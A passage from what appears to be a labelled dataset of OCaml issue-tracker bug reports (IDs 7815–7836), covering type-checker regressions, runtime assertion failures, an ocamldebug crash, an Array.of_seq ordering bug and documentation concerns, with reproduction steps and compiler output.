\"foo.ml\":\r\n\r\n-----\r\nmodule Make (X : sig val f : [ `A ] -> unit end) = struct\r\n  let make f1 f2 arg = match arg with `A -> f1 arg; f2 arg\r\n  let f = make X.f (fun _ -> ())\r\nend\r\n-----\r\n\r\nExecuting \"ocaml -principal foo.ml\" will yield:\r\n\r\n  Fatal error: exception File \"typing/btype.ml\", line 177, characters 9-15: Assertion failed\r\n\r\nThe problem will only appear with \"-principal\" and does not seem to exist in versions before OCaml 4.07.0.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7836\n**Reporter:** jtsang\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-08-09T20:46:50Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.1\n**Category:** typing\n\n## Bug description\n\nThe following triggers warning 16 (optional argument cannot be erased):\r\n\r\nlet f ?a = ()\r\nlet f ~b ?a = ()\r\n\r\nThe following does not:\r\n\r\nlet f ?a ~b = ()\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7835\n**Reporter:** @trefis\n**Assigned to:** @trefis\n**Status:** resolved (set by @trefis on 2018-09-21T19:16:35Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** typing\n**Monitored by:** @hhugo @Drup\n\n## Bug description\n\nSince the introduction of GADTs, we've been reserving a slot for up to a\r\nthousand existentials to be introduced during typing of pattern matches.\r\n\r\nThis is done by: https://github.com/ocaml/ocaml/blob/4.00/typing/typecore.ml#L2741\r\n\r\nThe reason for this is that scoping for type constructors is tracked using their\r\nbinding time.\r\nIf that line wasn't present, then if we did introduce new types, their binding\r\ntime would be above the current level. Which means that any use of such a type\r\nwould be out of the scope of the type constructor.\r\n\r\nhttps://github.com/ocaml/ocaml/pull/1951 proposes to explicitely check that we\r\ndo not introduce more than a thousand type constructors, instead of letting them\r\nthrough and then potentially reporting weird (i.e. incorrect) scope errors.\r\n\r\nThe hole in that reasonning (and in the GPR linked to above) is that type\r\nconstructors are not the only identifiers created during pattern matches:\r\npattern variables will also imply creating some idents, for example.\r\n\r\nhttps://github.com/trefis/existentialism/blob/master/too_many_existentials/main.ml\r\nillustrates that.\r\n\r\nBut pattern variables are not the only thing implying the creation of idents\r\nthough, otherwise we could almost dismiss the problem with \"meh, no reasonable\r\nhand written code will ever contain more than X many pattern variables, so it's\r\nalright\" (which I assume was the rational behind the 1K limit on existential per\r\nmatch).\r\n\r\nAn example as trivial as https://github.com/trefis/existentialism/blob/master/wrong-escape/main.ml\r\ncan also get us over the limit if [Sub] contains a few too many idents. Indeed\r\nin that example, thanks to the 1st line introducing a module alias, a\r\nsubstitution on the signature of [Sub] happens during the typing of the\r\n[M.Sub.Pack] pattern, which will generate as many fresh idents as there are\r\nidents in [Other_module.Sub].\r\n\r\nIf you clone that repository and run \"make failure OCAMLC=/path/to/trunk/ocamlc\"\r\nin the wrong-escape directory, then you'll get:\r\n\r\n    File \"main.ml\", line 6, characters 11-12:\r\n    Error: This expression has type $Pack_'a\r\n           but an expression was expected of type 'a\r\n           The type constructor $Pack_'a would escape its scope\r\n\r\nThe error also happens at the tip of the 4.07 branch.\r\n\r\nThis example was encountered when trying to compile janestreet's code base with\r\nthe tip of the 4.07 branch.\r\n\r\nThe reason why it wasn't a problem on 4.07.0 is that the slot happened to be\r\nmade much bigger (as was already discussed), which makes it much less likely\r\nto create so many idents in real code.\r\n\r\nThe reason why it wasn't a problem before 4.07 is that the 1k limit was actually\r\njust a big lie. The scope of type constructors introduced for existential\r\nvariables wasn't tracked using the ident binding time: we were looking up the\r\ntype declaration in the environment, and checking at which level it was\r\nintroduced: https://github.com/ocaml/ocaml/blob/4.00/typing/ctype.ml#L689\r\nThat is, you could have added 10k existential, and the scoping would have been\r\ncorrect for each of them.\r\nhttps://github.com/trefis/existentialism/blob/master/over_999/main.ml is an\r\nexample of this.\r\n\r\nHowever, that piece of code disappeared with https://github.com/ocaml/ocaml/pull/1609\r\n\r\n---\r\n\r\nThere are a few possible ways to fix (or minimize the issue):\r\n\r\n1. Let's remove the double meaning associed to stamps in identifiers. Introduce\r\na dedicated \"scope\" field and rely on that.\r\n\r\n2. Reintroduce the piece of code which disappeared. That is basically a worse\r\nversion of (1): it removes the double meaning associed to identifiers stamps but\r\nonly for existentials, and the \"scope\" field is not a proper field but we go and\r\nfetch the information in the environment\r\n\r\n3. Leave a bigger slot when typing a match. 1k is clearly too small for real\r\ncode, 100k causes an other kind of issues. How about 10k? I have a good feeling\r\nabout 10k ( https://youtu.be/8Xjr2hnOHiM?t=1m34s ).\r\n\r\n\r\nI have started working on (1), but I am disappearing for my vacations next\r\nThursday, and it's unlikely that I will have a GPR opened before then. The\r\nchange is nothing too complicated but it is fairly invasive, so it takes a bit\r\nof time.\r\n\r\nThat is: I hope (1) will be the fix chosen for 4.08, but if we want to release\r\n4.07.1 it probably won't be ready in time, and it's also too much for a bugfix\r\nrelease.\r\n\r\nIf we want to release a 4.07.1 compiler soonish, then (2) and (3) should be\r\nconsidered.\r\n\r\n(2) is \"more correct\", in the sense that we're back to a world where we can have\r\nas many existential as we want. Though it will most likely have a negative\r\nimpact on typing time (because we have to do a lookup in the environment\r\nwhenever we call [update_level]).\r\n\r\nPersonnaly I think I'd go with (3): it's the simplest change, it's unlikely to\r\nbe problematic in practice, and won't incur any performance regression compared\r\nto 4.07.0.\r\nThat's the choice we've made internally at janestreet.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7833\n**Reporter:** jsimeon\n**Status:** resolved (set by @damiendoligez on 2018-10-03T14:40:00Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**OS:** macOS\n**Version:** 4.07.0\n**Target version:** 4.07.1+dev/rc1\n**Fixed in version:** 4.07.1+dev/rc1\n**Category:** typing\n**Monitored by:** @nojb @gasche bacam\n\n## Bug description\n\nThe type checker fails when compiling a large OCaml file/module. The\r\nfailure is dependent on how long the file (how many type declarations\r\nare in the module).\r\n\r\nThis is a regression in OCaml 4.07.0:\r\n\r\n```\r\nbash-3.2$ ~/.opam/4.06.1/bin/ocamlopt -c large.ml \r\nbash-3.2$ ~/.opam/4.06.1/bin/ocamlopt -c larger.ml \r\nbash-3.2$ ~/.opam/4.07.0/bin/ocamlopt -c large.ml \r\nbash-3.2$ ~/.opam/4.07.0/bin/ocamlopt -c larger.ml \r\nFile \"larger.ml\", line 80844, characters 24-58:\r\nError: Constraints are not satisfied in this type.\r\n       Type constant_config should be an instance of constant_config\r\n```\r\nFiles `large.ml` amd `larger.ml` only differ in that some declarations have been removed.\r\n\r\n```\r\nbash-3.2$ ls -la *large*.ml\r\n-rw-r--r--  1 jeromesimeon  staff  5707725 Jul 28 09:25 large.ml\r\n-rw-r--r--  1 jeromesimeon  staff  5724307 Jul 28 09:25 larger.ml\r\nbash-3.2$ tail large.ml \r\n\r\nlet constant_localization _ _ x = x.constant_localization\r\n\r\n(** val constant_type :\r\n    foreign_type -> brand_model -> constant_config -> rtype **)\r\n\r\nlet constant_type _ _ x = x.constant_type\r\n\r\ntype constants_config = (char list * constant_config) list\r\n\r\nbash-3.2$ tail larger.ml \r\n\r\nlet constant_localization _ _ x = x.constant_localization\r\n\r\n(** val constant_type :\r\n    foreign_type -> brand_model -> constant_config -> rtype **)\r\n\r\nlet constant_type _ _ x = x.constant_type\r\n\r\ntype constants_config = (char list * constant_config) list\r\n                                     ^^^^^^^^^^^^^^^ Type error here\r\n\r\n```\n\n## Steps to reproduce\n\nSince this is size-dependent, it's a bit difficult to reproduce. The problem was notice when compiling an OCaml module obtained through extraction from Coq for the qcert project (https://github.com/querycert/qcert).\r\n\r\nI attach the `larger.ml` file below.\n\n## Additional information\n\nIn case this is useful, a little bit of investigation and a lot of second guessing:\r\n\r\nI'm wondering if this has to do with the notion of `level` in the OCaml types/typechecker.\r\n\r\nWhen instrumenting the `check_constraints_rec` in the `typedecl.ml`\r\nmodule of type checker\r\n(https://github.com/ocaml/ocaml/blob/4132d38ec5da4874688b957c28d0fcba2e8bbb9e/typing/typedecl.ml#L579) as follows:\r\n```\r\n      with Ctype.Unify _ -> assert false\r\n      | Not_found -> raise (Error(loc, Unavailable_type_constructor path))\r\n      end;\r\n      begin\r\n        begin match ty.desc with\r\n        | Tconstr (p, _, _) ->\r\n            if ((Printtyp.string_of_path p) = \"constant_config\")\r\n            then\r\n              begin\r\n                Format.eprintf \"TY @[%a@]@.\" Printtyp.raw_type_expr ty;\r\n                Format.eprintf \"TY' @[%a@]@.\" Printtyp.raw_type_expr ty'\r\n              end;\r\n        | _ -> ()\r\n        end;\r\n        if not (Ctype.matches env ty ty') then\r\n          raise (Error(loc, Constraint_failed (ty, ty')))\r\n      end;\r\n      List.iter (check_constraints_rec env loc visited) args\r\n```\r\nit seems that the Ctype.matches fails when the level gets above the fixed `100000000` constant:\r\n\r\n```\r\nbash-3.2$ /usr/local/bin/ocamlopt -version \r\n4.07.0\r\nbash-3.2$ /usr/local/bin/ocamlopt -c large.ml \r\nTY {id=722337;level=100000000;desc=Tconstr(constant_config,[],[])}\r\nTY' {id=722372;level=95814902;desc=Tconstr(constant_config,[],[])}\r\nbash-3.2$ /usr/local/bin/ocamlopt -c larger.ml \r\nTY {id=729061;level=100000000;desc=Tconstr(constant_config,[],[])}\r\nTY' {id=729096;level=100115003;desc=Tconstr(constant_config,[],[])}\r\nFile \"larger.ml\", line 80844, characters 24-58:\r\nError: Constraints are not satisfied in this type.\r\n       Type constant_config should be an instance of constant_config\r\n```\r\n\r\nThe same instrumentation in version 4.06.0 of the compiler shows very different levels:\r\n```\r\nbash-3.2$ /usr/local/bin/ocamlopt -version \r\n4.06.0\r\nbash-3.2$ /usr/local/bin/ocamlopt -c large.ml \r\nTY {id=574607;level=100000000;desc=Tconstr(constant_config,[],[])}\r\nTY' {id=574642;level=18593;desc=Tconstr(constant_config,[],[])}\r\nbash-3.2$ /usr/local/bin/ocamlopt -c larger.ml \r\nTY {id=580482;level=100000000;desc=Tconstr(constant_config,[],[])}\r\nTY' {id=580517;level=18724;desc=Tconstr(constant_config,[],[])}\r\n```\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7832\n**Reporter:** @jberdine\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2018-07-25T00:43:05Z)\n**Resolution:** not a bug\n**Priority:** low\n**Severity:** minor\n**Version:** 4.07.0\n**Category:** typing\n**Monitored by:** @jberdine\n\n## Bug description\n\nA bug in ocamlformat found by hhugo uncovered some, to me, surprising sensitivity of the type checker to the presence of parentheses around applications. See the following toplevel interaction for example:\r\n\r\n<ocaml>\r\n# let id x = x;;\r\nval id : 'a -> 'a = <fun>\r\n# let plus a ?(b=0) c = a + b + c;;\r\nval plus : int -> ?b:int -> int -> int = <fun>\r\n# id (plus 1);;\r\n- : ?b:int -> int -> int = <fun>\r\n# id (plus 1) 1;;\r\n- : int = 2\r\n# (id (plus 1)) ~b:1;;\r\n- : int -> int = <fun>\r\n# id (plus 1) ~b:1;;\r\nError: This expression has type ?b:int -> int -> int\r\n       but an expression was expected of type b:'a -> 'b\r\n</ocaml>\r\n\r\nNote the last two expressions are the same except for two nested 1-argument applications versus a single 2-argument application, but the first types and the second doesn't. Is this difference expected? Is there a description of when such distinctions are important? (Ideally ocamlformat would emit the parens where needed but not have to for all nested applications, so I'm looking for some syntactic criterion to use to distinguish which Parsetrees need the parens and which don't.)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7831\r\n**Reporter:** @db4\r\n**Status:** acknowledged (set by @xavierleroy on 2018-07-29T16:02:31Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** major\r\n**Version:** 4.07.0\r\n**Target version:** 4.08.0+dev/beta1/beta2\r\n**Category:** runtime system and C interface\r\n**Related to:** #7829\r\n\r\n## Bug description\r\n\r\nAnother problem while running the testsuite with the debug runtime inside a docker container, now on Linux x64:\r\n\r\n ... testing 'weaklifetime.ml' with 1 (native) => passed\r\n ... testing 'weaklifetime.ml' with 2 (bytecode) => Process 14407 got signal 6(Aborted), core dumped\r\n\r\nfile gc_ctrl.c; line 71 ### Assertion failed: Color_hd (Hd_val (v)) != Caml_blue\r\n\r\nUnfortunately, it does not happen always, restarted build may succeed, but no other test case seems to be failing on my x64 setup.\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7830\n**Reporter:** jserot\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-08-21T17:01:27Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Platform:** Mac\n**OS:** Mac OS\n**OS Version:** 10.9.5\n**Version:** 4.06.0\n**Target version:** 4.08.0+dev/beta1/beta2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nOcamldebug sometimes quits launching an Â« Not_found Â» exception when trying to visualize some program variables. Here's a session example :\r\n\r\n8<--------- START of EXAMPLE \r\n\r\n$ ocamldebug -version\r\nThe OCaml debugger, version 4.06.0\r\n$ ocamldebug rfsmc\r\n\tOCaml Debugger version 4.06.0\r\nExecuting file .ocamldebug\r\nDirectories:  _build lib lib/_build . /Users/jserot/.opam/4.06.0/lib/ocaml\r\n(ocd) set arguments -dot -target_dir /tmp ../../examples/single/chrono/chrono.fsm\r\n(ocd) break @ Fsm 308\r\nLoading program... done.\r\nBreakpoint 1 at 758316: file lib/fsm.ml, line 308, characters 5-3585\r\n(ocd) run\r\nTime: 10027 - pc: 758316 - module Fsm\r\nBreakpoint: 1\r\n308     <|b|>let bind_param vs (p,ty) =\r\n(ocd) print tenv\r\nRemoved breakpoint 1 at 758316: file lib/fsm.ml, line 308, characters 5-3585\r\nUncaught exception: Not_found\r\n\r\n8<--------- END of EXAMPLE \r\n\r\nThe problem is not systematic and seems to depend on the variable to be printed (or at least on the module where it is defined). For example, setting a breakpoint in the Main (top-level) module is ok.This makes isolating a minimum triggering program difficult.\r\n\r\nI therefore give a pointer to a publicly available program on which it shows and a sequence of step to reproduce it.\n\n## Steps to reproduce\n\n1. Dowload the program :\r\n   - cd /tmp\r\n   - git clone https://github.com/jserot/rfsm\r\n2. Build the executable (-g option is set by default)\r\n    - cd rfsm\r\n    - mkdir ../rfsm-install\r\n    - ./configure --prefix ../rfsm-install --no-gui\r\n    - make\r\n3. Go to the src/compiler directory and launch the debugger\r\n    - cd src/compiler/\r\n    - ocamldebug rfsmc\r\n4. Set argument and put a breakpoint somewhere in the code\r\n    (ocd) set arguments -dot -target_dir /tmp ../../examples/single/chrono/chrono.fsm\r\n    (ocd) break @ Fsm 308\r\n5. Run\r\n    (ocd) run\r\n6. Try to print a variable (tenv, an argument of the function build_instance here) \r\n    (ocd) print tenv\r\n\r\nThis gives :\r\n*** Removed breakpoint 1 at 758316: file lib/fsm.ml, line 308, characters 5-3585\r\nUncaught exception: Not_found\n\n## Additional information\n\nI did not try with 4.07.0 but since Ocamldebug is not mentioned in the Changelog i doubt this would make a difference (additionally, my program is bound to 4.06.0 because it must build under windows..)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7829\r\n**Reporter:** @db4\r\n**Status:** acknowledged (set by @dra27 on 2018-07-24T11:17:41Z)\r\n**Resolution:** open\r\n**Priority:** high\r\n**Severity:** crash\r\n**Platform:** i386\r\n**OS:** Linux\r\n**Version:** 4.07.0\r\n**Target version:** 4.08.0+dev/beta1/beta2\r\n**Category:** runtime system and C interface\r\n**Related to:** #7831\r\n**Monitored by:** @nojb @gasche\r\n\r\n## Bug description\r\n\r\nWhen running the testsuite with the debug runtime inside docker container I'm getting many errors like this:\r\n\r\nRunning tests from 'tests/runtime-errors' ...\r\nfile freelist.c; line 463 ### Assertion failed: prev < bp || prev == Fl_head\r\nAborted (core dumped)\r\n\r\nI tried to debug the problem and added\r\n\r\n  if (!(prev < bp || prev == Fl_head)) {\r\n    fprintf (stderr, \"%lx %lx %lx\\n\", prev, bp, Fl_head);\r\n  }\r\n\r\nbefore line 463. That gave me\r\n\r\n58476004 f731b4cc 56dfd5a4\r\n\r\nSo the bug is obvious now. prev and bp are values (i.e. signed ints) so compiler uses signed compare here. But we would like to compare prev and bp as pointers that are unsigned addresses.\r\n\r\nThe fix for this problem is trivial but I'm afraid it's not the only place where signed compare is incorrectly used for pointers.\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7828\n**Reporter:** @trefis\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-09-03T09:26:18Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.1\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** typing\n**Monitored by:** @gasche @diml\n\n## Bug description\n\nNoticed on 4.06 by Stefan Muenzel, reproduced on trunk.\r\n\r\n        OCaml version 4.06.1\r\n\r\n# type t = I of int [@@unboxed] [@@immediate];;\r\ntype t = I of int [@@immediate] [@@unboxed]\r\n# external id : t -> t = \"%identity\";;         \r\nCharacters 0-34:\r\n  external id : t -> t = \"%identity\";;\r\n  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\nWarning 61: This primitive declaration uses type t, which is unannotated and\r\nunboxable. The representation of such types may change in future\r\nversions. You should annotate the declaration of t with [@@boxed]\r\nor [@@unboxed].\r\nCharacters 0-34:\r\n  external id : t -> t = \"%identity\";;\r\n  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\nWarning 61: This primitive declaration uses type t, which is unannotated and\r\nunboxable. The representation of such types may change in future\r\nversions. You should annotate the declaration of t with [@@boxed]\r\nor [@@unboxed].\r\nexternal id : t -> t = \"%identity\"\r\n# external id : (t [@unboxed]) -> (t [@unboxed]) = \"%identity\";;\r\nCharacters 15-16:\r\n  external id : (t [@unboxed]) -> (t [@unboxed]) = \"%identity\";;\r\n                 ^\r\nError: Don't know how to unbox this type. Only float, int32, int64 and nativeint can be unboxed\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7826\r\n**Reporter:** @ppedrot\r\n**Status:** acknowledged (set by @xavierleroy on 2018-07-19T16:01:07Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.06.1\r\n**Category:** middle end (typedtree to clambda)\r\n**Monitored by:** @nojb\r\n\r\n## Bug description\r\n\r\nThe Closure.close_functions function computes the set of free variables of its arguments, which is O(n). Unluckily this function is recursive and it subcalls can do the same, which leads to a runtime quadratic in the number of nested abstraction nodes.\r\n\r\nI doubt this is an issue in handwritten code, but the problem sure happens in generated code. I hit it in the native compilation scheme of Coq code from fiat-crypto, and the compiler takes ages for a term that is big but not crazy either (~ 500kloc of sparse code, every line being a constructor most of the time).\r\n\r\nI do not have a small reproducible test-case at hand, this would require extracting it from the generated code and making it standalone, which is not easy.\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7825\n**Reporter:** @gasche\n**Assigned to:** @Octachron\n**Status:** resolved (set by @gasche on 2018-09-12T07:56:38Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** text\n**Target version:** 4.08.0+dev/beta1/beta2\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** documentation\n**Related to:** #7247\n**Monitored by:** @nojb @Yakobowski\n\n## Bug description\n\nWitness this reddit question ( https://www.reddit.com/r/ocaml/comments/8znh3d/using_location_module/ ) by giltho: \r\n\r\n> I'm building a Parser with Menhir and I'm trying to use the Location module.\r\n> However, open Location fails with the message Unbound module Location,\r\n> am I missing something ? Location isn' t part of the core library ?\r\n\r\nIf you look at the OCaml manual per-module,\r\n\r\n  https://caml.inria.fr/pub/docs/manual-ocaml-4.07/libref/Location.html\r\n\r\nor \r\n\r\n  https://caml.inria.fr/pub/docs/manual-ocaml-4.07/libref/\r\n\r\nit indeed isn't visible at all that some modules are part of the standard library (have an outward-facing interface with stability guarantees) and others are part of the compiler-libs (haphazard documentation, no stability from version to version).\r\n\r\nIt is important to allow people to distinguish these two kind of modules, and in fact it may have been a mistake to include the compiler-libs documentation online without a clearer separation. I think we should think about a clearer separation, and maybe revisit the idea of includling compiler-libs in the manual in this way. We *could* describe compiler-libs and encourage people to read .mli file, for example, which has the advantage of clearly marking the fact that they are doing something \"more advanced\" -- and more fragile.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7824\n**Reporter:** talex\n**Assigned to:** @trefis\n**Status:** resolved (set by @trefis on 2018-07-19T17:03:46Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.07.0\n**Fixed in version:** 4.07.1+dev/rc1\n**Category:** typing\n**Monitored by:** @nojb\n\n## Bug description\n\nI'm trying to find out why 0install doesn't compile on OCaml 4.07. I now have a fairly small test case which works on 4.06 and seems very suspicious.\n\n## Steps to reproduce\n\n$ docker run --rm -it ocaml/opam2:4.07 \r\n\r\nopam@2688edb5639b:~/opam-repository$ cat > test.ml\r\nmodule Element : sig\r\n  type +'a t\r\n\r\n  val from_a : [`A] t -> unit\r\n  val from_ab : [< `A | `B] t -> unit\r\nend = struct\r\n  type 'a t = 'a\r\n\r\n  let from_a x = assert false\r\n  let from_ab x = assert false\r\nend\r\n\r\nlet f x =\r\n  Element.from_a x;\r\n  Element.from_ab x;\r\n  match [] with\r\n  | _::_ -> (x :> [`A | `C] Element.t)\r\n\r\nopam@2688edb5639b:~/opam-repository$ ocaml test.ml \r\nFile \"./test.ml\", line 17, characters 12-38:\r\nError: Type [ `A ] Element.t is not a subtype of [ `A | `C ] Element.t \r\n       The first variant type does not allow tag(s) `C\n\n## Additional information\n\nThis happens on my dev machine with 4.07, as well as with the Docker image.\r\n\r\nMaking seemingly-unrelated changes (e.g. changing the _::_ pattern to _) allows it to be type checked successfully. Asking merlin for the type of [x] and then adding that, as [let f (x:[ `A ] Element.t) = ...], also allows it to pass.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7822\n**Reporter:** @Octachron\n**Assigned to:** @garrigue\n**Status:** confirmed (set by @garrigue on 2018-07-31T10:19:59Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Version:** 4.07.0\n**Target version:** 4.08.0+dev/beta1/beta2\n**Category:** typing\n**Monitored by:** @gasche @Yakobowski\n\n## Bug description\n\nWhen typing overly complex refutation clauses, it is possible to exploit the lack of backtracking for ident binding time in the counter-example search to go beyond the authorized number of existential variables during the search and then refute the pattern even if counter-examples exist further down in the search tree.\r\n\r\nAs an illustration, the attached file construct a type level encoding of\r\nof a piece moving on a 4Ã4 board and then proceed to simultaneously\r\nrefute the existence of hamiltonian paths and produce a hamiltonian path\r\nas a counter-example (by pruning the search path and avoiding the issue above).\r\n\r\nDoes this count as a bug?\n\n## File attachments\n\n- [minichess.ml](https://gist.githubusercontent.com/vicuna/c8a76cbc413e11b682e433d0b3f7497e/raw/c6b521bef0b2d3c80d55a2426ae7a4170740e11c/minichess.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7821\n**Reporter:** @diml\n**Assigned to:** @diml\n**Status:** resolved (set by @diml on 2018-07-16T13:36:08Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.07.0\n**Category:** typing\n**Monitored by:** @nojb @gasche @Yakobowski\n\n## Bug description\n\nThe \"steps to reproduce\" shows a case that fails with 4.07 but used to work with previous versions of the Compiler. The first build succeeds but the second fails.\r\n\r\nWhat I don't understand is that the error mentions base.cmi when compiling info.ml. However Base depends on every other modules and no module depends on it, so the compiler shouldn't even try to read base.cmi when compiling info.ml.\r\n\r\nI was thinking this could be due to the heuristic I added to print X__Y as X.Y, however there is no error message in the build so there is no type to print.\n\n## Steps to reproduce\n\n$ git clone https://github.com/janestreet/base.git\r\n$ cd base\r\n$ git checkout v0.11\r\n$ make\r\n$ sed -i '1i(* *)' src/string0.ml\r\n$ make\r\njbuilder build @install\r\n      ocamlc src/.base.objs/base__Info.{cmo,cmt} (exit 2)\r\n(cd _build/default && /usr/local/home/jdimino/opam-root/4.07.0/bin/ocamlc.opt -w -40 -safe-string -g -bin-annot -I src/.base.objs -I /usr/local/home/jdimino/opam-root/4.07.0/lib/sexplib0 -I compiler-stdlib/src/.caml.objs -I shadow-stdlib/src/.shadow_stdlib.objs -no-alias-deps -open Base__ -o src/.base.objs/base__Info.cmo -c -impl src/info.ml)\r\nFile \"src/info.ml\", line 1:\r\nError: The files src/.base.objs/base__Info_intf.cmi\r\n       and src/.base.objs/base.cmi make inconsistent assumptions\r\n       over interface Base__String0\r\n    ocamlopt src/.base.objs/base__Info.{cmx,o} (exit 2)\r\n(cd _build/default && /usr/local/home/jdimino/opam-root/4.07.0/bin/ocamlopt.opt -w -40 -safe-string -g -I src/.base.objs -I /usr/local/home/jdimino/opam-root/4.07.0/lib/sexplib0 -I compiler-stdlib/src/.caml.objs -I shadow-stdlib/src/.shadow_stdlib.objs -no-alias-deps -open Base__ -o src/.base.objs/base__Info.cmx -c -impl src/info.ml)\r\nFile \"src/info.ml\", line 1:\r\nError: The files src/.base.objs/base__Info_intf.cmi\r\n       and src/.base.objs/base.cmi make inconsistent assumptions\r\n       over interface Base__String0\r\nmake: *** [default] Error 1\n\n## File attachments\n\n- [log-first-build](https://gist.githubusercontent.com/vicuna/80774038bb8571f94f74b4c6b4c3dd88/raw/42402ad0f2cbf2ee155f8f94ea040eeb7d586a30/log-first-build)\n- [log-second-build](https://gist.githubusercontent.com/vicuna/80774038bb8571f94f74b4c6b4c3dd88/raw/7dca6b8e749e4053f690d3c64c2ff6fc293cdfa8/log-second-build)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7820\n**Reporter:** thierry.martinez\n**Status:** resolved (set by @xavierleroy on 2018-07-11T17:17:49Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.07.0\n**Fixed in version:** 4.07.1+dev/rc1\n**Category:** standard library\n\n## Bug description\n\nWith OCaml 4.07.0 and trunk, we have\r\n\r\n# Array.of_seq (Array.to_seq [| 1; 2; 3 |]);;\r\n- : int array = [|3; 1; 2|]\r\n\r\nIn stdlib/array.ml, line 337 (last line of of_rev_list), we have\r\n      fill (len-1) tl\r\nwhereas it should be\r\n      fill (len-2) tl\r\nsince hd, which should be assigned to the cell (len - 1), is skipped.\n\n## Steps to reproduce\n\nRun the top-level and execute the following line\r\n\r\n# Array.of_seq (Array.to_seq [| 1; 2; 3 |]);;\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7818\n**Reporter:** mandrykin\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2018-09-21T06:19:36Z)\n**Resolution:** fixed\n**Priority:** high\n**Severity:** crash\n**Platform:** x86_64 SMP\n**OS:** Linux 4.4.0\n**OS Version:** Ubuntu 16.04.4\n**Version:** 4.06.1\n**Target version:** 4.07.1+dev/rc1\n**Fixed in version:** 4.07.1+dev/rc1\n**Category:** typing\n**Monitored by:** @nojb @Drup\n\n## Bug description\n\n# module Termsig = struct\r\n    module Term0 = struct\r\n      module type S = sig\r\n        module Id : sig end\r\n      end\r\n    end\r\n    module Term = struct\r\n      module type S = sig\r\n        module Term0 : Term0.S\r\n        module T = Term0\r\n      end\r\n    end\r\n  end;;\r\n  \r\n# module Make (T' : Termsig.Term.S) = struct\r\n    module T = struct\r\n      include T'.T\r\n      let u = 1\r\n      let u = 1\r\n    end\r\n  end;;\r\n\r\nGives:\r\nError: Signature mismatch:\r\n       Modules do not match:\r\n         sig\r\n           module Id = T'.Term0.Id\r\n           module Id2 = Id\r\n           val u : int\r\n           val u : int\r\n         end\r\n       is not included in\r\n         sig module Id = T'.Term0.Id module Id2 = Id val u : int end\r\n       In module Id:\r\n       Module T'.Term0.Id cannot be aliased\r\n\r\nWhile after removing the rebinding of `u`:\r\n\r\n# module Make (T' : Termsig.Term.S) = struct\r\n    module T = struct\r\n      include T'.T\r\n      let u = 1\r\n    end\r\n  end;;\r\n\r\nis accepted as well as\r\n\r\n# module Make (T' : Termsig.Term.S) = struct\r\n    module T = struct\r\n      include T'.T\r\n      module Id2 = Id\r\n      let u = 1\r\n    end\r\n  end;;\r\n\r\n(so the module aliasing seems not to be related).\r\n\r\nThe real cause of the error is too confusing to me to try to explain it more clearly in the summary.\n\n## File attachments\n\n- [cannot_alias.ml](https://gist.githubusercontent.com/vicuna/5d84b377766fba2b71b79351a86180d2/raw/d192c38f6fcbef6abeff3f0c249031b79756ba39/cannot_alias.ml)\n- [cannot_alias2.ml](https://gist.githubusercontent.com/vicuna/5d84b377766fba2b71b79351a86180d2/raw/df46482205e3410535f559dc5864b6bd2c297028/cannot_alias2.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7815\r\n**Reporter:** joris\r\n**Assigned to:** @damiendoligez\r\n**Status:** resolved (set by @xavierleroy on 2018-07-19T15:56:08Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** crash\r\n**Platform:** amd64\r\n**OS:** linux\r\n**Version:** 4.06.1\r\n**Target version:** 4.07.1+dev/rc1\r\n**Fixed in version:** 4.07.1+dev/rc1\r\n**Category:** runtime system and C interface\r\n**Monitored by:** @nojb @gasche @ygrek @jmeber\r\n\r\n## Bug description\r\n\r\nCalling Gc.full_major (or simply major) after allocating thousands of block of different word size and freeing half of them with first_fit policy makes the runtime crash with no meaningful trace\r\n\r\n## Steps to reproduce\r\n\r\nCompile the attached file with\r\nopam install gperftools # install tcmalloc\r\n\r\nocamlfind ocamlopt -g -linkpkg -package gperftools minimal.ml\r\n\r\nand run it. On my machine it also crashes with jemalloc with rounds = 3 and nr_blocks = 20000\r\n\r\nopam install jemalloc\r\nocamlfind ocamlopt -g -linkpkg -package jemalloc_ctl minimal.ml\r\n\r\n## Additional information\r\n\r\nBackground:\r\nThis code is an un-natural example and it was obviously 